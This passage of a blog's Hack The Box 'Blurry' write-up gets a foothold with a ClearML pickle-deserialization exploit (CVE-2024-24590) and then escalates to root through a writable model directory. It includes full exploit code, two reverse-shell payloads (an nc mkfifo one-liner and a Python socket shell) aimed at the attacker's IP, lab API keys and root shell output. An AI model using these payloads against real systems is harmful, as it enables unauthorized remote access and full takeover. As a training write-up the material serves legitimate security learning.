</span></span><span class="line"><span class="cl"><span class="n">Use</span> <span class="s1">&#39;sudo apt autoremove&#39;</span> <span class="n">to</span> <span class="n">remove</span> <span class="n">them</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">following</span> <span class="n">NEW</span> <span class="n">packages</span> <span class="n">will</span> <span class="n">be</span> <span class="n">installed</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">  <span class="n">python3</span><span class="o">.</span><span class="mi">11</span><span class="o">-</span><span class="n">venv</span>
</span></span><span class="line"><span class="cl"><span class="mi">0</span> <span class="n">upgraded</span><span class="p">,</span> <span class="mi">1</span> <span class="n">newly</span> <span class="n">installed</span><span class="p">,</span> <span class="mi">0</span> <span class="n">to</span> <span class="n">remove</span> <span class="ow">and</span> <span class="mi">394</span> <span class="ow">not</span> <span class="n">upgraded</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="n">Need</span> <span class="n">to</span> <span class="n">get</span> <span class="mi">5</span><span class="p">,</span><span class="mi">884</span> <span class="n">B</span> <span class="n">of</span> <span class="n">archives</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="n">After</span> <span class="n">this</span> <span class="n">operation</span><span class="p">,</span> <span class="mf">28.7</span> <span class="n">kB</span> <span class="n">of</span> <span class="n">additional</span> <span class="n">disk</span> <span class="n">space</span> <span class="n">will</span> <span class="n">be</span> <span class="n">used</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="n">Get</span><span class="p">:</span><span class="mi">1</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">kali</span><span class="o">.</span><span class="n">download</span><span class="o">/</span><span class="n">kali</span> <span class="n">kali</span><span class="o">-</span><span class="n">rolling</span><span class="o">/</span><span class="n">main</span> <span class="n">amd64</span> <span class="n">python3</span><span class="o">.</span><span class="mi">11</span><span class="o">-</span><span class="n">venv</span> <span class="n">amd64</span> <span class="mf">3.11</span><span class="o">.</span><span class="mi">9</span><span class="o">-</span><span class="mi">1</span> <span class="p">[</span><span class="mi">5</span><span class="p">,</span><span class="mi">884</span> <span class="n">B</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">Fetched</span> <span class="mi">5</span><span class="p">,</span><span class="mi">884</span> <span class="n">B</span> <span class="ow">in</span> <span class="mi">0</span><span class="n">s</span> <span class="p">(</span><span class="mf">62.8</span> <span class="n">kB</span><span class="o">/</span><span class="n">s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">Selecting</span> <span class="n">previously</span> <span class="n">unselected</span> <span class="n">package</span> <span class="n">python3</span><span class="o">.</span><span class="mi">11</span><span class="o">-</span><span class="n">venv</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">Reading</span> <span class="n">database</span> <span class="o">...</span> <span class="mi">461710</span> <span class="n">files</span> <span class="ow">and</span> <span class="n">directories</span> <span class="n">currently</span> <span class="n">installed</span><span class="o">.</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">Preparing</span> <span class="n">to</span> <span class="n">unpack</span> <span class="o">.../</span><span class="n">python3</span><span class="o">.</span><span class="mi">11</span><span class="o">-</span><span class="n">venv_3</span><span class="o">.</span><span class="mf">11.9</span><span class="o">-</span><span class="mi">1</span><span class="n">_amd64</span><span class="o">.</span><span class="n">deb</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="n">Unpacking</span> <span class="n">python3</span><span class="o">.</span><span class="mi">11</span><span class="o">-</span><span class="n">venv</span> <span class="p">(</span><span class="mf">3.11</span><span class="o">.</span><span class="mi">9</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="n">Setting</span> <span class="n">up</span> <span class="n">python3</span><span class="o">.</span><span class="mi">11</span><span class="o">-</span><span class="n">venv</span> <span class="p">(</span><span class="mf">3.11</span><span class="o">.</span><span class="mi">9</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">blurry</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">venv</span> <span class="o">.</span><span class="n">env</span>            
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">blurry</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="n">source</span> <span class="o">.</span><span class="n">env</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">activate</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="o">.</span><span class="n">env</span><span class="p">)</span><span class="err">─</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">blurry</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="n">pip</span> <span class="n">install</span> <span class="n">clearml</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">...</span><span class="n">INSTALLING</span> <span class="n">CLEARML</span><span class="o">....</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="o">.</span><span class="n">env</span><span class="p">)</span><span class="err">─</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">blurry</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="n">clearml</span><span class="o">-</span><span class="n">init</span>
</span></span><span class="line"><span class="cl"><span class="n">ClearML</span> <span class="n">SDK</span> <span class="n">setup</span> <span class="n">process</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Please</span> <span class="n">create</span> <span class="n">new</span> <span class="n">clearml</span> <span class="n">credentials</span> <span class="n">through</span> <span class="n">the</span> <span class="n">settings</span> <span class="n">page</span> <span class="ow">in</span> <span class="n">your</span> <span class="err">`</span><span class="n">clearml</span><span class="o">-</span><span class="n">server</span><span class="err">`</span> <span class="n">web</span> <span class="n">app</span> <span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">g</span><span class="o">.</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">localhost</span><span class="p">:</span><span class="mi">8080</span><span class="o">//</span><span class="n">settings</span><span class="o">/</span><span class="n">workspace</span><span class="o">-</span><span class="n">configuration</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="n">Or</span> <span class="n">create</span> <span class="n">a</span> <span class="n">free</span> <span class="n">account</span> <span class="n">at</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">app</span><span class="o">.</span><span class="n">clear</span><span class="o">.</span><span class="n">ml</span><span class="o">/</span><span class="n">settings</span><span class="o">/</span><span class="n">workspace</span><span class="o">-</span><span class="n">configuration</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">In</span> <span class="n">settings</span> <span class="n">page</span><span class="p">,</span> <span class="n">press</span> <span class="s2">&#34;Create new credentials&#34;</span><span class="p">,</span> <span class="n">then</span> <span class="n">press</span> <span class="s2">&#34;Copy to clipboard&#34;</span><span class="o">.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Paste</span> <span class="n">copied</span> <span class="n">configuration</span> <span class="n">here</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="n">api</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">web_server</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">app</span><span class="o">.</span><span class="n">blurry</span><span class="o">.</span><span class="n">htb</span>
</span></span><span class="line"><span class="cl">  <span class="n">api_server</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">api</span><span class="o">.</span><span class="n">blurry</span><span class="o">.</span><span class="n">htb</span>
</span></span><span class="line"><span class="cl">  <span class="n">files_server</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">files</span><span class="o">.</span><span class="n">blurry</span><span class="o">.</span><span class="n">htb</span>
</span></span><span class="line"><span class="cl">  <span class="n">credentials</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;access_key&#34;</span> <span class="o">=</span> <span class="s2">&#34;Y2Y197NIHJ5OJJRTFBAR&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;secret_key&#34;</span> <span class="o">=</span> <span class="s2">&#34;Kx5UxAWA9XaiR9wyiodtWoxxGjrO5lPPLeF1MhwOjZagsDGXH3&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">Detected</span> <span class="n">credentials</span> <span class="n">key</span><span class="o">=</span><span class="s2">&#34;Y2Y197NIHJ5OJJRTFBAR&#34;</span> <span class="n">secret</span><span class="o">=</span><span class="s2">&#34;Kx5U***&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ClearML</span> <span class="n">Hosts</span> <span class="n">configuration</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="n">Web</span> <span class="n">App</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">app</span><span class="o">.</span><span class="n">blurry</span><span class="o">.</span><span class="n">htb</span>
</span></span><span class="line"><span class="cl"><span class="n">API</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">api</span><span class="o">.</span><span class="n">blurry</span><span class="o">.</span><span class="n">htb</span>
</span></span><span class="line"><span class="cl"><span class="ne">File</span> <span class="n">Store</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">files</span><span class="o">.</span><span class="n">blurry</span><span class="o">.</span><span class="n">htb</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Verifying</span> <span class="n">credentials</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="n">Credentials</span> <span class="n">verified</span><span class="o">!</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">New</span> <span class="n">configuration</span> <span class="n">stored</span> <span class="ow">in</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kali</span><span class="o">/</span><span class="n">clearml</span><span class="o">.</span><span class="n">conf</span>
</span></span><span class="line"><span class="cl"><span class="n">ClearML</span> <span class="n">setup</span> <span class="n">completed</span> <span class="n">successfully</span><span class="o">.</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The configuration file can be found at the <strong>app.blurry.htb</strong> endpoint when we enter a username, select &ldquo;New Experiment,&rdquo; and retrieve the config file from there.</p>
<p>
    
    <input type="checkbox" id="zoomCheck-b8db8" hidden>
    <label for="zoomCheck-b8db8">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Blurry%20b534b7f9d35247b2b536889719c43db2/Untitled%203.png" alt="Untitled" 
             />
    </label></p>
<p>I found a recent CVE-2024–24590: Pickle Load on Artifact Get related to ClearML. The following is the script we will be using.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">import</span> <span class="n">os</span>
</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">subprocess</span>
</span></span><span class="line"><span class="cl"><span class="n">from</span> <span class="n">clearml</span> <span class="n">import</span> <span class="n">Task</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">ShellExecutor</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.62 4444 &gt;/tmp/f&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">,</span> <span class="p">(</span><span class="n">cmd</span><span class="p">,))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">shell_executor</span> <span class="o">=</span> <span class="n">ShellExecutor</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">task</span> <span class="o">=</span> <span class="n">Task</span><span class="o">.</span><span class="n">init</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="n">project_name</span><span class="o">=</span><span class="s2">&#34;Black Swan&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">task_name</span><span class="o">=</span><span class="s2">&#34;r3zyd3v&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">tags</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;review&#34;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="n">task_type</span><span class="o">=</span><span class="n">Task</span><span class="o">.</span><span class="n">TaskTypes</span><span class="o">.</span><span class="n">data_processing</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">output_uri</span><span class="o">=</span><span class="n">True</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">task</span><span class="o">.</span><span class="n">upload_artifact</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="n">name</span><span class="o">=</span><span class="s2">&#34;r3zyd3v&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">artifact_object</span><span class="o">=</span><span class="n">shell_executor</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">retries</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">wait_on_upload</span><span class="o">=</span><span class="n">True</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">task</span><span class="o">.</span><span class="n">execute_remotely</span><span class="p">(</span><span class="n">queue_name</span><span class="o">=</span><span class="s1">&#39;default&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, if I execute the above script in the same location where I installed ClearML, I will get a shell on port 4444. In my script, I have specified my tun0 IP address and the port for the reverse shell:</p>
<p><code>cmd = &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.62 4444 &gt;/tmp/f&quot;</code> here.</p>
<p>Once we run the script, it creates a task, uploads the artifact, and then we receive the shell.</p>
<p>At this point, we have a shell as the user and have obtained the user flag.</p>
<h2 id="root-flag">Root Flag<a hidden class="anchor" aria-hidden="true" href="#root-flag">#</a></h2>
<p>If I run <code>sudo -l</code>, I can see that I can execute the <code>/usr/bin/evaluate_model</code> binary as root without needing a password.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">jippity@blurry:~$ sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries for jippity on blurry:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
</span></span><span class="line"><span class="cl">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User jippity may run the following commands on blurry:
</span></span><span class="line"><span class="cl">    (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth
</span></span></code></pre></td></tr></table>
</div>
</div><p>This Bash script searches for files that end with <code>.pth</code> in the <code>/models</code> directory, removes any malicious content, and then executes them. I also checked that we have write access to the models directory.</p>
<p>I will now open a Netcat session on my Kali machine on port 6969. Then, I removed the <code>evaluate_model.py</code> script from the <code>/models</code> directory.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">jippity@blurry:~$ cd /models
</span></span><span class="line"><span class="cl">jippity@blurry:/models$ ls
</span></span><span class="line"><span class="cl">demo_model.pth  evaluate_model.py
</span></span><span class="line"><span class="cl">jippity@blurry:/models$ rm -r evaluate_model.py 
</span></span><span class="line"><span class="cl">rm: remove write-protected regular file &#39;evaluate_model.py&#39;? y
</span></span><span class="line"><span class="cl">jippity@blurry:/models$ ls
</span></span><span class="line"><span class="cl">demo_model.pth
</span></span></code></pre></td></tr></table>
</div>
</div><p>I created the same file (which I made using <code>echo</code> and appended the code) named <code>evaluate_model.py</code> with the script shown below (the output of the <code>cat</code> command):</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">jippity@blurry:/models$ echo &#39;import socket, subprocess, os, pty; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((&#34;10.10.16.62&#34;, 6969)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn(&#34;/bin/bash&#34;)&#39; &gt; evaluate_model.py
</span></span><span class="line"><span class="cl">jippity@blurry:/models$ cat evaluate_model.py 
</span></span><span class="line"><span class="cl">echo &#39;import socket, subprocess, os, pty; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((&#34;10.10.16.62&#34;, 6969)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn(&#34;/bin/bash&#34;)&#39; &gt; evaluate_model.py
</span></span></code></pre></td></tr></table>
</div>
</div><p>I ran <code>sudo /usr/bin/evaluate_model /models/*.pth</code>, and when I checked my Netcat session, I saw:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/blurry/CVE]
</span></span><span class="line"><span class="cl">└─$ nc -lnvp 6969
</span></span><span class="line"><span class="cl">listening on [any] 6969 ...
</span></span><span class="line"><span class="cl">connect to [10.10.16.62] from (UNKNOWN) [10.10.11.19] 35976
</span></span><span class="line"><span class="cl">root@blurry:/models# cd ~
</span></span><span class="line"><span class="cl">cd ~
</span></span><span class="line"><span class="cl">root@blurry:~# id  
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl">uid=0(root) gid=0(root) groups=0(root)
</span></span></code></pre></td></tr></table>
</div>
</div><p>We rooted this box.</p>
<h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
<p>Thank you for following my write-up for this medium yet fun box from Hack The Box!</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/hackthebox/">HackTheBox</a></li>
      <li><a href="http://localhost:1313/tags/linux/">Linux</a></li>
      <li><a href="http://localhost:1313/tags/medium/">Medium</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="http://localhost:1313/writeups/hackthebox/busqueda/">
    <span class="title">« Prev</span>
    <br>
    <span>Busqueda Writeup - HackTheBox</span>
  </a>
  <a class="next" href="http://localhost:1313/writeups/hackthebox/freelancer/">
    <span class="title">Next »</span>
    <br>
    <span>Freelancer Writeup - HackTheBox</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="http://localhost:1313/">Rezy Dev</a></span> · 

    <span>
        <a href="https://creativecommons.org/licenses/by-nc/4.0/" rel="noopener noreferrer" target="_blank">Some rights reserved</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
